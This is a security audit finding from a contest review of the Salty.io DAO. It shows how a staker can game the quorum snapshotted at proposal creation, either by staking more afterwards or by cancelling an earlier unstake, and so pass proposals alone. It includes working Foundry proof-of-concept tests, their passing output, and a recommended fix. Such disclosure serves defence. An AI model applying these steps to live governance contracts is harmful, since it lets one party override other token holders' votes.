# [M] Partial snapshot means staking after proposal creation gives unfair benefit

## Summary
Severity: Medium
Chain: Smart contract
Component: 2024-03-saltyio-mitigation
Published: 2024-03-02
Source: https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/6
Type: code-finding

## Details
# Lines of code

https://github.com/othernet-global/salty-io/blob/main/src/dao/Proposals.sol#L110


# Vulnerability details

## Summary & Impact
The [mitigation](https://github.com/othernet-global/salty-io/commit/c46069644739885fa36e84e27e1dd6362b854663) for [M-11](https://github.com/code-423n4/2024-01-salty-findings/issues/716) is meant to stop the user from getting extra voting power (by reducing the quorum) via unstaking their SALT after proposal creation. Although the fix on [L110](https://github.com/othernet-global/salty-io/blob/main/src/dao/Proposals.sol#L110) successfully mitigates the existing issue by saving the value of `requiredQuorum` at the time of proposal creation, new attack vectors open up due to it.

## Attack Vector 1
- Suppose the initial staked amount in the system is `6_000_000` (all figures in `ether`, so `6_000_000 * 10**18`).
- Alice has `630_000` with her which she wants to stake and float a proposal.
- It works in Alice's favour to not stake all the amount at once. This is because if she stakes all at once, the required quorum would be `10% of (6_000_000 + 630_000) = 663_000` and hence she will have to depend on others for her proposal to pass. She realizes there's a better way to keep the required quorum value in her favour. 
- Alice stakes with `aliceStakedAmount_1 = 60_000` and floats a proposal.
- The `requiredQuorum` right now is `10%` which equals ` 606000`.
- She now stakes her remaining `aliceStakedAmount_2 = 570_000`. This can be staked immediately after proposal creation or after a wait time of 14 days.
- Alice votes `yes`. Her proposal now has `630_000` votes, surpassing the `requiredQuorum` and hence passing the proposal.
- Alice can now _optionally_ choose to unstake her SALT.

## Attack Vector 2
- Suppose the initial staked amount in the system is `6_000_000` (all figures in `ether`, so `6_000_000 * 10**18`).
- Alice **has already staked** `630_000` and she now wants to float a new proposal.
- Alice **unstakes** `570_000`. She only has `60_000` staked now. 
- She floats a proposal.
- The `requiredQuorum` right now is `10%` which equals ` 606000`.
- She now calls `cancelUnstake()` to get her `570_000` back.
- Alice votes `yes`. Her proposal now has `630_000` votes, surpassing the `requiredQuorum` and hence passing the proposal.

## Recommended Mitigation Steps
It is not sufficient to only save the snapshot by storing the `requiredQuorum` on [L110](https://github.com/othernet-global/salty-io/blob/main/src/dao/Proposals.sol#L110) at proposal creation time. The protocol needs to also save the voting power of the users at that timestamp. Any SALT staked later on can not be included in voting power.

## Proof of Concept
Add these 2 tests inside `src/dao/tests/DAO.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_t0x1c_` to see both the tests pass:
```js
  function test_t0x1c_stakingAfterProposalCreation() public {
    deal(address(salt), address(DEPLOYER), 6_000_000 ether);
    vm.prank(DEPLOYER);
    staking.stakeSALT(6_000_000 ether);

    // Set up the parameters for the proposal
    uint256 proposalNum = 0; // Assuming an enumeration starting at 0 for parameter proposals
    uint256 ballotID = 1;
    deal(address(salt), address(alice), 630_000 ether);

    // Alice stakes her SALT to get voting power
    uint256 aliceStakedAmount_1 = 60_000 ether;
    uint256 aliceStakedAmount_2 = 570_000 ether;

    vm.startPrank(alice);
    staking.stakeSALT(aliceStakedAmount_1);

    // Propose a parameter ballot
    proposals.proposeParameterBallot(proposalNum, "Increase max pools count");
    emit log_named_decimal_uint("requiredQuorumForBallotType =", proposals.requiredQuorumForBallotType(BallotType.PARAMETER), 18);

    // stakes again with a much larger amount, now that the proposal has been floated
    staking.stakeSALT(aliceStakedAmount_2);

    skip(14 days);

    // Alice casts a vote, enough for quorum
    proposals.castVote(ballotID, Vote.INCREASE);

    // OPTIONAL STEP -- Alice unstakes her SALT
    // staking.unstake(aliceStakedAmount_1 + aliceStakedAmount_2, 52);
    vm.stopPrank();

    emit log_named_decimal_uint("votes cast in favour =", proposals.votesCastForBallot(ballotID, Vote.INCREASE), 18);

    // Now it should be possible to finalize the ballot
    dao.finalizeBallot(ballotID);
    // Check that the ballot is finalized
    bool isBallotFinalized = !proposals.ballotForID(ballotID).ballotIsLive;
    assertTrue(isBallotFinalized);
  }



	function test_t0x1c_cancelUnstakeToManipulateVotingPower() public {
		deal(address(salt), address(DEPLOYER), 6_000_000 ether);
		vm.prank(DEPLOYER);
		staking.stakeSALT(6_000_000 ether);
		uint256 aliceStakedAmount = 630_000 ether;
		deal(address(salt), address(alice), aliceStakedAmount);
		vm.startPrank(alice);
		staking.stakeSALT(aliceStakedAmount);


		// Set up the parameters for the proposal
		uint256 proposalNum = 0; // Assuming an enumeration starting at 0 for parameter proposals
		uint256 ballotID = 1;

		// Alice unstakes her SALT first, before floating the proposal
		uint256 aliceUnstakeAmount = 570_000 ether;
		uint256 unstakeID = staking.unstake(aliceUnstakeAmount, 52);


		// Propose a parameter ballot
		proposals.proposeParameterBallot(proposalNum, "Increase max pools count");
		emit log_named_decimal_uint("requiredQuorumForBallotType =", proposals.requiredQuorumForBallotType(BallotType.PARAMETER), 18); // only 10% of (6_000_000 + 60_000) = 606_000

		// Alice cancels her unstake
		staking.cancelUnstake(unstakeID);

		skip(14 days);

		// Alice casts a vote, enough for quorum
		proposals.castVote(ballotID, Vote.INCREASE);

		vm.stopPrank();

		emit log_named_decimal_uint("votes cast in favour =", proposals.votesCastForBallot(ballotID, Vote.INCREASE), 18);

		// Now it should be possible to finalize the ballot
		dao.finalizeBallot(ballotID);
		// Check that the ballot is finalized
		bool isBallotFinalized = !proposals.ballotForID(ballotID).ballotIsLive;
		assertTrue(isBallotFinalized);
	}
```

Output:
```js
Ran 2 tests for src/dao/tests/DAO.t.sol:TestDAO
[PASS] test_t0x1c_cancelUnstakeToManipulateVotingPower() (gas: 954702)
Logs:
  requiredQuorumForBallotType =: 606000.000000000000000000
  votes cast in favour =: 630000.000000000000000000

[PASS] test_t0x1c_stakingAfterProposalCreation() (gas: 1045244)
Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 10.52s
```


## Assessed type

Other
